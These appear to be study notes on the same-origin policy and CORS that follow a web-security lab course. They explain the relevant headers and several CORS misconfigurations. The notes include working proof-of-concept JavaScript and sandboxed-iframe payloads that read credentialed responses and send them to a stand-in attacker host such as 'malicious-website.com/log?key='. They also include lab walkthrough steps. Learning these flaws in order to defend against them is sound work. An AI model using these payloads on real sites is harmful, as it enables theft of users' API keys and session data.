                                        ## What is the same-origin policy?
# The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other. 
# The same-origin policy restricts scripts on one origin from accessing data from another origin.
# An origin consists of a URI scheme, domain and port number. For example, consider the following URL: 

                                        ## Relaxation of the same-origin policy
                                        
# The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints.
# Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. 
# A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS). 
# The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted.
# These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access. 

Example: http://normal-website.com/example/example.html


<> This uses the scheme http, the domain normal-website.com, and the port number 80
<> The following table shows how the same-origin policy will be applied if content at the above URL tries to access other origins: 

                                  URL accessed 	                        Access permitted?
                          http://normal-website.com/example/ 	Yes: same scheme, domain, and port
                          http://normal-website.com/example2/ 	Yes: same scheme, domain, and port
                          https://normal-website.com/example/ 	No: different scheme and port
                          http://en.normal-website.com/example/ 	No: different domain
                          http://www.normal-website.com/example/ 	No: different domain
                          http://normal-website.com:8080/example/ 	No: different port* 



*Internet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy. 

                                         ## What is CORS (cross-origin resource sharing)?
                                    
# Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain
# It extends and adds flexibility to the same-origin policy (SOP)
# However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented.
# CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).



                                      ## CORS and the Access-Control-Allow-Origin response header
                                      
 # The cross-origin resource sharing specification provides controlled relaxation of the same-origin policy for HTTP requests to one website domain from another through the use of a collection of HTTP headers.
 # Browsers permit access to responses to cross-origin requests based upon these header instructions.
 
                                        ## What is the Access-Control-Allow-Origin response header?
                                        
# The Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request.
# A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match. 

                                          ## Implementing simple cross-origin resource sharing 
#  For example, suppose a website with origin normal-website.com causes the following cross-domain request: 

                                          GET /data HTTP/1.1
                                          Host: robust-website.com
                                          Origin : https://normal-website.com
#  The server on robust-website.com returns the following response: 

                                            HTTP/1.1 200 OK
                                            ...
                                            Access-Control-Allow-Origin: https://normal-website.com
                                      
# The browser will allow code running on normal-website.com to access the response because the origins match. 
# The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *.
# However, no browser supports multiple origins and there are restrictions on the use of the wildcard *. 


                                             ## Handling cross-origin resource requests with credentials
                                             
# The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. 
# However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true.
# Now if the requesting website uses JavaScript to declare that it is sending cookies with the request: 

                                                GET /data HTTP/1.1
                                                Host: robust-website.com
                                                ...
                                                Origin: https://normal-website.com
                                                Cookie: JSESSIONID=<value>
#  And the response to the request is: 

                                                HTTP/1.1 200 OK
                                                ...
                                                Access-Control-Allow-Origin: https://normal-website.com
                                                Access-Control-Allow-Credentials: true
                                      
# Then the browser will permit the requesting website to read the response, because the Access-Control-Allow-Credentials response header is set to true.
# Otherwise, the browser will not allow access to the response.  


                                                  ## Relaxation of CORS specifications with wildcards 
                                                  
 #  The header Access-Control-Allow-Origin supports wildcards. For example: Access-Control-Allow-Origin: * 
 
 
Note

Note that wildcards cannot be used within any other value. For example, the following header is not valid:
Access-Control-Allow-Origin: https://*.normal-website.com 

Consequently, a cross-domain server response of the form: 
                              Access-Control-Allow-Origin: *
                              Access-Control-Allow-Credentials: true
is not permitted as this would be dangerously insecure, exposing any authenticated content on the target site to everyone. 


                        
                                                   ## Pre-flight checks 
                                                   
 # The pre-flight check was added to the CORS specification to protect legacy resources from the expanded request options allowed by CORS.
 # Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.
 # For example, this is a pre-flight request that is seeking to use the PUT method together with a custom request header called Special-Request-Header: 
 
                                          OPTIONS /data HTTP/1.1
                                          Host: <some website>
                                          ...
                                          Origin: https://normal-website.com
                                          Access-Control-Request-Method: PUT
                                          Access-Control-Request-Headers: Special-Request-Header
                                          
# The server might return a response like the following:  

                                  HTTP/1.1 204 No Content
                                  ...
                                  Access-Control-Allow-Origin: https://normal-website.com
                                  Access-Control-Allow-Methods: PUT, POST, OPTIONS
                                  Access-Control-Allow-Headers: Special-Request-Header
                                  Access-Control-Allow-Credentials: true
                                  Access-Control-Max-Age: 240
                                  
# This response sets out the allowed methods (PUT, POST and OPTIONS) and permitted request headers (Special-Request-Header).
# In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for caching the pre-flight response for reuse.
# Pre-flight checks add an extra HTTP request round-trip to the cross-domain request, so they increase the browsing overhead. 


                          
                          
                                                      ## Vulnerabilities arising from CORS configuration issues
                                                      
# Many modern websites use CORS to allow access from subdomains and trusted third parties.
# Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities. 

  <> Server-generated ACAO header from client-specified Origin header
#  Some applications need to provide access to a number of other domains.
#  Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality.
#  So some applications take the easy route of effectively allowing access from any other domain. 

<> One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.
# For example, consider an application that receives the following request: 

                                                    GET /sensitive-victim-data HTTP/1.1
                                                    Host: vulnerable-website.com
                                                    Origin: https://malicious-website.com
                                                    Cookie: sessionid=...
                                      
                                      
#  It then responds with: 

                                                    HTTP/1.1 200 OK
                                                    Access-Control-Allow-Origin: https://malicious-website.com
                                                    Access-Control-Allow-Credentials: true
                                                    ...
                                                    
# These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session. 

# Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain.

# If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website: 

                                                      var req = new XMLHttpRequest();
                                                      req.onload = reqListener;
                                                      req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
                                                      req.withCredentials = true;
                                                      req.send();

                                                      function reqListener() {
                                                         location='//malicious-website.com/log?key='+this.responseText;
                                                      };

                                      
                                      
                                      

 Example: 
STEP1: Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.  

STEP2: Send the request to Burp Repeater, and resubmit it with the added header:
       Origin: https://example.com

STEP3:  Observe that the origin is reflected in the Access-Control-Allow-Origin header. 

STEP4: In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL: 

                                                  <script>
                                                      var req = new XMLHttpRequest();
                                                      req.onload = reqListener;
                                                      req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
                                                      req.withCredentials = true;
                                                      req.send();

                                                      function reqListener() {
                                                          location='/log?key='+this.responseText;
                                                      };
                                                  </script>
                                                  
                                                  
                                
                                                      ## Errors parsing Origin headers
                                                      
# Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
# When a CORS request is received, the supplied origin is compared to the whitelist.
# If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.
# For example, the application receives a normal request like: 

                                                  GET /data HTTP/1.1
                                                  Host: normal-website.com
                                                  ...
                                                  Origin: https://innocent-website.com
                                                  
# The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:   

                                                  HTTP/1.1 200 OK
                                                  ...
                                                  Access-Control-Allow-Origin: https://innocent-website.com
# Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence).
# And some applications allow access from various other organizations' domains including their subdomains.
# These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. 
# Any mistakes in the implementation can lead to access being granted to unintended external domains.

<> For example, suppose an application grants access to all domains ending in:
  normal-website.com 

<> An attacker might be able to gain access by registering the domain: 
  hackersnormal-website.com OR normal-website.com.evil-user.net
  

                                                             ## Whitelisted null origin value
# The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:


                                                      Cross-origin redirects.
                                                      Requests from serialized data.
                                                      Request using the file: protocol.
                                                      Sandboxed cross-origin requests.
                                                      
<> Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request: 

                                                  GET /sensitive-victim-data
                                                  Host: vulnerable-website.com
                                                  Origin: null
                                                  
<> And the server responds with: 

                                                HTTP/1.1 200 OK
                                                Access-Control-Allow-Origin: null
                                                Access-Control-Allow-Credentials: true    
                                                
                                                
 <> In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. 
 
                                              <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
                                              var req = new XMLHttpRequest();
                                              req.onload = reqListener;
                                              req.open('get','vulnerable-website.com/sensitive-victim-data',true);
                                              req.withCredentials = true;
                                              req.send();

                                              function reqListener() {
                                              location='malicious-website.com/log?key='+this.responseText;
                                              };
                                              </script>"></iframe>
                                              
                                                 
                                                    OR 
                                                    
                                          <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
                                              var req = new XMLHttpRequest();
                                              req.onload = reqListener;
                                              req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
                                              req.withCredentials = true;
                                              req.send();
                                              function reqListener() {
                                                  location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
                                              };
                                          </script>"></iframe>     
                                          
                                          
                                          
                                              
                                                            ## Exploiting XSS via CORS trust relationships 
                                                            
# Even "correctly" configured CORS establishes a trust relationship between two origins.
# If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application. 

<> Given the following request: 

                                            GET /api/requestApiKey HTTP/1.1
                                            Host: vulnerable-website.com
                                            Origin: https://subdomain.vulnerable-website.com
                                            Cookie: sessionid=...
<>  If the server responds with: 

                                              HTTP/1.1 200 OK
                                              Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
                                              Access-Control-Allow-Credentials: true
<> Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like: 

                                  https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
                                  
                                  
                                              
                                         ## Breaking TLS with poorly configured CORS 
                                         
# Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. 
# For example, when the application receives the following request: 

                                          GET /api/requestApiKey HTTP/1.1
                                          Host: vulnerable-website.com
                                          Origin: http://trusted-subdomain.vulnerable-website.com
                                          Cookie: sessionid=...
 
 # The application responds with: 
 
                                          HTTP/1.1 200 OK
                                          Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
                                          Access-Control-Allow-Credentials: true
                                          
# In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application


                                          
                                          
                                          
                                          
                                          
                                                             
                                                             
                                                             
  
  
                                                  
